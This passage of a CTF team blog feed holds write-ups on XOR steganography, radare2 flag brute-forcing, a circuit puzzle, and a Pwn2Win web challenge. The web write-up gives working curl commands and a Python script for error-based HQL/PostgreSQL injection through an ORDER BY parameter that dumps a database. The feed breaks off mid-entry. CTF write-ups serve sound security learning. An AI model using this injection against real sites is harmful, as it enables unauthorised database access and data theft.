    <title>[Misc] TUCTF - Gr8 Pictures</title>
    <link href="https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/"/>
    <id>https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/</id>
    <published>2017-12-01T07:58:48.000Z</published>
    <updated>2017-12-01T12:03:55.939Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Gr8 Pictures<br>50<br><br>The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know that he connects to gr8pics.tuctf.com:4444 to hide his message in the picture. Your mission, should you choose to accept it, is to find out what message he is trying to hide.<br><br>nc gr8pics.tuctf.com 4444<br>If you get connection refused, use nc gr8pics.tuctf.com 41234<br>NOTE: the server does not show a prompt, but if the connection is successful, you are at the correct starting point.<br>NOTE: without connecting to the server, the flag is theoretically cryptographically impossible to get<br>NOTE: If you’re getting a bunch of data that doesn’t seem to stop - it stops after ~3MB of data<br><br>sha1<br>9044fe96a50ecb831fe451f13c24cc96b0a9e24d flag.png<br><br></blockquote>

<p>This was a simple misc, we were told in the challenge description that a hacker from 4chan was using this service to hide messages within images, if we sent a message with a length &gt;= 50 the service would return an image with the message hidden within in the image, after receiving it I noticed that the only difference between the image given from the challenge and the one generated in the service was 50 bytes (which makes sense since I sent a message with 50 length), I was suspicious that the server were encrypting the message using a simple xor so to test this I sent 50 null bytes to the service:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print '\x00'*50"</span> | nc gr8pics.tuctf.com 4444 | base64 -d &gt; flag2.png</div></pre></td></tr></table></figure>
<p>But why send only null bytes? If they are using xor we can retrieve the key completely! xoring any number by zero will return always the number! You could easily get the 50 new bytes by comparing all non equal bytes between flag.png flag2.png:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">file2 = open(<span class="string">'flag2.png'</span>, <span class="string">'rb'</span>)</div><div class="line">file = open(<span class="string">'flag.png'</span>, <span class="string">'rb'</span>)</div><div class="line">s = bytearray(file.read())</div><div class="line">s2 = bytearray(file2.read())</div><div class="line"></div><div class="line">k = <span class="number">0</span></div><div class="line">key = <span class="string">''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</div><div class="line">  <span class="keyword">if</span> s[i] != s2[i]:</div><div class="line">    key += chr(s2[i])</div><div class="line"></div><div class="line"><span class="keyword">print</span> key</div></pre></td></tr></table></figure>
<p>By running it we could easily get the key!<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py</div><div class="line">Isnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r</div></pre></td></tr></table></figure></p>
<p>Having the key is easy to decrypt the original flag we just need to adapt our script to:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">file2 = open(<span class="string">'test.png'</span>, <span class="string">'rb'</span>)</div><div class="line">file = open(<span class="string">'flag.png'</span>, <span class="string">'rb'</span>)</div><div class="line">s = bytearray(file.read())</div><div class="line">s2 = bytearray(file2.read())</div><div class="line"></div><div class="line">k = <span class="number">0</span></div><div class="line">key = <span class="string">''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</div><div class="line">  <span class="keyword">if</span> s[i] != s2[i]:</div><div class="line">    key += chr(s2[i])</div><div class="line">    flag += chr(s[i] ^ s2[i])</div><div class="line"><span class="keyword">print</span> key</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>And finally the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py</div><div class="line">Isnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r</div><div class="line">TUCTF&#123;st3g@n0gr@phy<span class="string">'s_so_c00l,No0ne_steals_my_msg&#125;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Gr8 Pictures&lt;br&gt;50&lt;br&gt;&lt;br&gt;The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] TUCTF - Unknown</title>
    <link href="https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/"/>
    <id>https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/</id>
    <published>2017-11-27T05:27:55.000Z</published>
    <updated>2017-11-27T06:09:18.351Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Unknown<br>200<br><br>Diggin through some old files we discovered this binary. Although despite our inspection we can’t figure out what it does. Or what it wants…<br><br>unknown - md5: 9f08f6e8240d4a0e098c4065c5737ca6<br><br></blockquote>

<h3 id="Reversing-the-binary"><a href="#Reversing-the-binary" class="headerlink" title="Reversing the binary"></a>Reversing the binary</h3><p>The binary has the following restrictions, we need to provide the correct flag as <code>argv[1]</code> and the length of the flag must have 56 of length as we can see bellow in the assembly:<br><a data-fancybox="gallery" href="https://i.imgur.com/iaNqW68.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/iaNqW68.png" alt=""><br></a><br>After this initial checks we are going to have a loop that checks each byte of the flag provided using a big encryption function <code>fcn.00401e90</code>, we can easily check if the byte is correct or not by checking the value of <code>RAX</code> after the function returns as it is explained in the image below:<br><a data-fancybox="gallery" href="https://i.imgur.com/AtYkwlN.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AtYkwlN.png" alt=""><br></a></p>
<h3 id="Radare2-Script"><a href="#Radare2-Script" class="headerlink" title="Radare2 Script"></a>Radare2 Script</h3><p>We don’t really need to reverse the encryption function <code>fcn.00401e90</code>, since we can write a radare2 script that checks the return values(<code>RAX</code>) from this function we can just brute-force the flag byte by byte, we need to update the address where the string is stored at each iteration/tentative, and in failed attempts we need to decrement the counter of the loop so we can recheck the same flag byte, this can be done with a script like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_string</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'%x'</span>% ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_address_value</span><span class="params">(addr, value)</span>:</span></div><div class="line">    r2.cmd(<span class="string">'s %s'</span> % addr)</div><div class="line">    r2.cmd(<span class="string">'wx %s'</span> % value)</div><div class="line">    r2.cmd(<span class="string">'s rip'</span>)</div><div class="line">            </div><div class="line"></div><div class="line">flag_try = <span class="string">'TUCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;'</span></div><div class="line">flag_list = list(flag_try)</div><div class="line"></div><div class="line">r2=r2pipe.open(<span class="string">'./unknown'</span>, flags=[<span class="string">'-2'</span>])</div><div class="line">r2.cmd(<span class="string">"ood %s"</span> % flag_try)</div><div class="line">r2.cmd(<span class="string">"aa"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x401c39"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x401C82"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">flag_address = r2.cmd(<span class="string">"dr rax"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">characters = string.ascii_lowercase+ string.digits + <span class="string">'_!&#125;'</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(flag_list)):</div><div class="line">    <span class="keyword">for</span> i,s <span class="keyword">in</span> enumerate(characters):</div><div class="line">        <span class="keyword">if</span> j &gt; <span class="number">5</span>:</div><div class="line">            flag_list[j] = s</div><div class="line">            change_address_value(flag_address, transform_string(<span class="string">''</span>.join(flag_list)))</div><div class="line">    </div><div class="line">        num = r2.cmd(<span class="string">'dr rax'</span>)</div><div class="line">        <span class="keyword">if</span> int(num,<span class="number">16</span>) == <span class="number">0x0</span>:</div><div class="line">            <span class="keyword">if</span> j &gt; <span class="number">5</span>:</div><div class="line">                flag_list[j] = characters[i<span class="number">-1</span>]</div><div class="line">                change_address_value(flag_address, transform_string(<span class="string">''</span>.join(flag_list)))</div><div class="line">            r2.cmd(<span class="string">'dc'</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            r2.cmd(<span class="string">'dr rax = 0x0'</span>)</div><div class="line">            change_address_value(<span class="string">'rbp-0xc'</span>, <span class="string">'%02x000000'</span> % (j<span class="number">-1</span>))           </div><div class="line">            r2.cmd(<span class="string">'dc'</span>)</div><div class="line">        sys.stdout.write(<span class="string">'\r'</span>+<span class="string">''</span>.join(flag_list))</div><div class="line">        sys.stdout.flush()</div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python unknown.py</div><div class="line">TUCTF&#123;w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Unknown&lt;br&gt;200&lt;br&gt;&lt;br&gt;Diggin through some old files we discovered this binary. Although despite our inspection we can’t figu
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
    
      <category term="tuctf2017" scheme="https://teamrocketist.github.io/tags/tuctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Electronics] Pwn2Win - Top Secret</title>
    <link href="https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/"/>
    <id>https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/</id>
    <published>2017-10-28T15:25:56.000Z</published>
    <updated>2017-10-28T15:50:44.445Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Top Secret<br><br>Molly was able to take pictures of a strange digital circuit sketch, along with an also strange message. All of these things were inside an envelope in a safe, which was labeled “Top Secret”.<br><br>We believe it might contain Butcher Corp’s plans for the future, can you help us read the message?<br><br>Link<br><br>Mirror<br><br>Id: top_secret<br><br>Total solves: 40<br><br>Score: 223<br><br>Categories: Eletronics<br></blockquote>

<p>To solve this problem the circuit is first analyzed and divided in to different blocks based on their function. The circuit can be divided in to four different functional blocks: The <strong>counter</strong>, the <strong>Multiplexer</strong> (LED Matrix line driver), the <strong>input circuit</strong> (LED Matrix column driver) and the <strong>8x8 LED Matrix</strong> (the Output).</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/aZZK1D4.jpg" target="_blank" rel="external"><br><img src="https://i.imgur.com/aZZK1D4.jpg" alt=""><br></a></p>
<p>The <strong>counter circuit</strong> counts from 0 to 7, the increments are done every falling edge. The clock is the 0 input. The output of the counter is a <strong>3-line binary number</strong> that is the line selection input of the <strong>multiplexer circuit</strong>. The main input of the multiplexer is connected to a <strong>high signal (binary 1)</strong>. </p>
<p>The multiplexer puts one line of its outputs (8 line multiplexer) in a <strong>high state</strong> and all others at a <strong>low state</strong>. The 3-line input from the counter selects the line which is to be put in a high state. The line output of the multiplexer is connected to a <strong>BJT transistor</strong> that connects the <strong>LED Matrix line</strong> to a low signal (binary 0) <strong>when this multiplexer output is in a high state</strong>. Basically, the BJT transistor <strong>works like a NOT gate</strong>.</p>
<p>In the input block every input is also connected to a <strong>BJT transistor</strong>. When an input is in the high state, the transistor connects the LED matrix column to a logical 0, and vice versa when the input is in a low state. Again, basically <strong>like a NOT gate</strong>. Some inputs have two transistors in series, so basically to NOT gates in series, and therefore here <strong>when the input signal is in a high state</strong>, the <strong>corresponding column is also</strong> in a high state.</p>
<p>Finally, in the LED matrix, every led is connected from a column to a line. A LED lights up when the column is in a logical high state and the line in a logical low state.</p>
<p>Combing this information with the <strong>received input sequence</strong> and <strong>aligning the date with all the inputs (0 to 8)</strong>, it is<strong> possible to decode </strong>what is shown in the LED matrix. To do this, the data is aligned and then imported to excel where, with some simple logic, the needed bits are flipped (based on the NOT inputs) and then with <strong>conditional formatting the LED outputs are simulated</strong>, RED is an off led and green a ON led. This is shown in the picture below, for the first character only, where the table on the left is the original data and the table on the left the interpreted data.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/26OngjS.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/26OngjS.png" alt=""><br></a></p>
<p>The full excel file can be found in this <a href="/content/files/pwn2win-2017/Test.xlsx">link</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Top Secret&lt;br&gt;&lt;br&gt;Molly was able to take pictures of a strange digital circuit sketch, along with an also strange message. A
    
    </summary>
    
      <category term="Electronics" scheme="https://teamrocketist.github.io/categories/Electronics/"/>
    
    
      <category term="electronics" scheme="https://teamrocketist.github.io/tags/electronics/"/>
    
      <category term="circuits" scheme="https://teamrocketist.github.io/tags/circuits/"/>
    
      <category term="transistor" scheme="https://teamrocketist.github.io/tags/transistor/"/>
    
      <category term="led" scheme="https://teamrocketist.github.io/tags/led/"/>
    
      <category term="logic" scheme="https://teamrocketist.github.io/tags/logic/"/>
    
      <category term="multiplexer" scheme="https://teamrocketist.github.io/tags/multiplexer/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Pwn2Win - Criminals</title>
    <link href="https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/"/>
    <id>https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/</id>
    <published>2017-10-24T06:53:16.000Z</published>
    <updated>2017-10-24T06:59:23.807Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Criminals<br><br>Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.<br><br><a href="http://200.136.213.109/" target="_blank" rel="external">http://200.136.213.109/</a><br><br>Automated tools are NOT required and NOT allowed.<br><br>Id: criminals<br><br>Total solves: 9<br><br>Score: 363<br><br>Categories: Web<br></blockquote>

<p>This web challenge only has one page and has this form bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/W7HlrKk.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/W7HlrKk.png" alt=""><br></a></p>
<p>The form has 4 inputs if we test each one of them with a single quote we will notice that an error pops up and we can see the admin of the website did use prepared statements but forgot about the order GET param:<br><a data-fancybox="gallery" href="https://i.imgur.com/a6pb0Ae.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/a6pb0Ae.png" alt=""><br></a><br>Now to solve this challenge we need first to check which <strong>dbms</strong> is running by just checking the error in the image we can see that is running on <strong>HBL</strong> (The Hibernate Query Language), some kind of a modified SQL with some restrictions, before talking about this lets first find which <strong>dbms</strong> is running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=abs(1)||2"</span> 2&gt;/dev/null | grep <span class="string">'post'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: operator does not exist: <span class="built_in">integer</span> || <span class="built_in">integer</span></div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)</div><div class="line">	org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388)</div><div class="line">	org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273)</div></pre></td></tr></table></figure>
<p>With this query we can generate an error that leaks the <strong>dbms</strong> it’s postgresql! now we need to find a way to inject and dump the database, I knew some injections in order by with <strong>mysql</strong> but in <strong>postgresql</strong> is somehow different and what the worst about this are the limitations we got from <strong>HBL</strong>.</p>
<p>AAfter spending alot of time trying to execute a subquery, I started searching on google, I knew we needed to something related with XML queries (Order by injections in MySql are similar) and then I found this great slides: </p>
<p><a href="https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf" target="_blank" rel="external">https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf</a><br><a data-fancybox="gallery" href="https://i.imgur.com/IvoeP2v.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/IvoeP2v.png" alt=""><br></a></p>
<p>This is perfect to put in the <strong>order by query</strong> this will return an integer and we can execute a subquery like we wanted, but the question is how are we going to leaking info? Postgres has a very nice feature, if we cast a string into an integer from a select for example we will generate an error! and the output of that sql query will be printed in the error! For this I used another function called <strong>pg_ls_dir</strong> this can list directories, if we use this to list the current directory and cast it into integer we are going to generate an error, leaking the directory for example:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir(<span class="keyword">CHR</span>(<span class="number">46</span>))<span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
<p>The output of this query is:<br><a data-fancybox="gallery" href="https://i.imgur.com/KaRVqJi.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/KaRVqJi.png" alt=""><br></a></p>
<p>As you can see above we leaked one directory named <strong>pg_xlog</strong> we can do exactly the same but instead of trying to read the log files we can leak the tables like this:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_upper(xpath ('row', query_to_xml ('<span class="keyword">select</span> <span class="keyword">cast</span>(pg_ls_dir((<span class="keyword">SELECT</span> column_name || <span class="keyword">CHR</span>(<span class="number">44</span>) || table_name <span class="keyword">FROM</span> information_schema.columns c <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)) <span class="keyword">as</span> <span class="built_in">int</span>)<span class="string">', true,  false,'')),1)</span></div></pre></td></tr></table></figure>
<p>The output of this query is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://200.136.213.109/'</span>  --data <span class="string">"name=&amp;age=&amp;crime=&amp;order=array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true,  false,'')),1)"</span> 2&gt;/dev/null | grep <span class="string">'root cause'</span></div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;javax.persistence.PersistenceException: org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.hibernate.exception.GenericJDBCException: could not extract ResultSet</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: could not open directory &amp;quot;secret,flag&amp;quot;: No such file or directory</div><div class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available <span class="keyword">in</span> the Apache Tomcat/8.0.47 logs.&lt;/u&gt;&lt;/p&gt;&lt;hr class=<span class="string">"line"</span>&gt;&lt;h3&gt;Apache Tomcat/8.0.47&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>We just leaked the table flag and the column secret! we can easily write a python script that leaks all the tables and gets the flag for us like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">host = <span class="string">'http://200.136.213.109/'</span></div><div class="line">data = &#123;<span class="string">'name'</span>:<span class="string">''</span>,<span class="string">'crime'</span>:<span class="string">''</span>,<span class="string">'order'</span>:<span class="string">''</span>,<span class="string">'age'</span>:<span class="string">''</span>&#125;</div><div class="line">query = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line">queryflag = <span class="string">"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset &#123;&#125;)) as int)', true,  false,'')),1)"</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">6</span>):</div><div class="line">	<span class="comment">#print x</span></div><div class="line">	data[<span class="string">'order'</span>] = query.format(x)</div><div class="line">	<span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">	r = requests.post(host, data=data)</div><div class="line">	<span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;,]+)&amp;quot;'</span>, r.text)</div><div class="line">data[<span class="string">'order'</span>] = queryflag.format(<span class="number">0</span>)</div><div class="line"><span class="keyword">print</span> data[<span class="string">'order'</span>]</div><div class="line">r = requests.post(host,data=data)</div><div class="line"><span class="keyword">print</span> re.findall(<span class="string">r'&amp;quot;([A-Za-z0-9_\-&#123;&#125;]+)&amp;quot;'</span>, r.text)</div></pre></td></tr></table></figure>
<p>Now running the script:</p>
<pre><code class="bash">$ python HQLI.py
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'secret,flag'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 1)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'id,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 2)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'age,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 3)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'crime,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 4)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'last_location,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 5)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'name,criminal'</span>]
array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class="string">'select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset 0)) as int)'</span>, <span class="literal">true</span>,  <span class="literal">false</span>,<span class="string">''</span>)),1)
[u<span class="string">'CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}'</span>]
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Criminals&lt;br&gt;&lt;br&gt;Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.&lt;br&gt;&lt;br&gt;&lt;a href
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="hqli" scheme="https://teamrocketist.github.io/tags/hqli/"/>
    
      <category term="xmlqueries" scheme="https://teamrocketist.github.io/tags/xmlqueries/"/>
    
      <category term="orderby" scheme="https://teamrocketist.github.io/tags/orderby/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win - Wrong User</title>
    <link href="https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/"/>
    <id>https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/</id>
    <published>2017-10-23T08:31:07.000Z</published>
    <updated>2017-10-26T23:41:27.948Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Wrong User<br><br>Molly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that you are also capable of invading such system and therefore she left a secret message to you. Can you get such message? Maybe you get troubles to get access with the correct user.<br><br>Server: nc 10.133.70.1 6666<br><br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br><a href="https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gz</a><br><br>Id: wrong_user<br><br>Total solves: 8<br><br>Score: 373<br><br>Categories: 